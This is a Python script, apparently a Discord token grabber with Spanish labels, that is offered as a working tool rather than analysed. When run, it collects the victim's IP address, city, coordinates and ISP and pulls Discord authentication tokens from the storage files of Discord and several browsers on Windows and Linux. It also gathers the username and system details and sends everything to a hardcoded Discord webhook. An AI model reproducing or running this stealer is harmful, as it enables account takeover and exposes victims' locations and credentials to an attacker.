import os
import re
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import platform
import json
from urllib.request import Request, urlopen

webhook = "https://discordapp.com/api/webhooks/814963434647060560/q2iIxsTsunoowUxlejRwJdM6DkP3xryeXddNiO1qjGgWd8uVw40hrnSpkZwi0RcPFusY" 

def find_ip():
    try:
        req = requests.get("http://ipinfo.io/json")
        data = req.json()
        ip = data['ip']
        isp = data['org']
        region = data['region'] 
        ciudad = data['city'] 
        coordenadas = data['loc']        
        return ip, region, ciudad, coordenadas, isp
    except:
        pass

def return_paths():
    if detect_os() == 1:
        paths = {
            "Discord": os.environ['HOME'] + "/.config/discord",
            "Discord Canary": os.environ['HOME'] + "/.config/discordcanary",
            "Discord PTB": os.environ['HOME'] + "/.config/discordptb",
            "Google Chrome": os.environ['HOME'] + "/.config/google-chrome/Default", 
            "Chromium": os.environ['HOME'] + "/.config/chromium/Default",
            "Brave": os.environ['HOME'] + "/.config/BraveSoftware/Brave-Browser/Default",
            "Opera": os.environ['HOME'] + "/.config/opera"
        }
    else:
        paths = {
            "Discord": os.getenv("APPDATA") + "\\Discord",
            "Discord Canary": os.getenv("APPDATA") + "\\discordcanary",
            "Discord PTB": os.getenv("APPDATA") + "\\discordptb",
            "Google Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
            "Opera": os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
            "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
    return paths

def detect_os():
    import os
    if os.name == "nt":
        os = 0
    else: 
        os = 1
    return os

def get_tokens(path):
    so = detect_os()
    if so == 0:
        path += "\\Local Storage\\leveldb"
    else:
        path += "/Local Storage/leveldb"
    tokens = []

    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}.[\w-]{6}.[\w-]{27}', r'mfa.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass
    
def send_token(tokens, navegadores, webh, ip:None, region:None, ciudad:None, coordenadas:None, isp:None):
    so = detect_os()
    if so == 0:
        user = os.environ["USERNAME"]
    else:
        user = os.environ["USER"]
    
    webhook = DiscordWebhook(url=webh)
    embed = DiscordEmbed(title="Tokens y otra información", description=f"Del usuario: {user}", color=0xe80dff)
    embed.set_footer(text="Grabber by: r2pc96")
    if not ip == None:
        embed.add_embed_field(name=f"Información de la IP", value=f"IP: {ip}\nRegión: {region}\nCiudad: {ciudad}\nCoordenadas:\n{coordenadas}\nISP:{isp}")
    try:
        osinfo = {
            'Sistema': platform.system(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Arquitectura': platform.machine(),
            'Procesador': platform.processor()
        }
        embed.add_embed_field(name=f"Información del Sistema", value=f"Sistema: {osinfo['Sistema']}\nRelease: {osinfo['Release']}\nVersión: {osinfo['Version']}\nArquitectura: {osinfo['Arquitectura']}\nProcesador: {osinfo['Procesador']}")
    except:
        pass
    counter = 0
    for token, navegador in zip(tokens, navegadores):
        counter += 1
        embed.add_embed_field(name=f"Token #{counter}\nNavegador: {navegador}", value=f"{token}", inline=False)
    webhook.add_embed(embed)
    webhook.execute()

def send_error(error, webhook=webhook):
    message = DiscordWebhook(url=webhook, content = error)
    message.execute()

def main(webh=webhook):
    tokens = []
    navegadores = []
    try:
        ip, region, ciudad, coordenadas, isp = find_ip()
    except:
        pass
    #paths = get_path()
    paths = return_paths()
    try:
        for navegador, path in paths.items():
            if os.path.exists(path) == False:
                continue
            for token in get_tokens(path):
                tokens.append(token)
                navegadores.append(navegador)
    except:
        send_error("Error: Ruta no encontrada.") 
        exit()
        #token = get_tokens(path)
    try:
        send_token(tokens, navegadores, webh, ip, region, ciudad, coordenadas, isp)
    except:
        send_error("Error: No se ha podido enviar.")
main()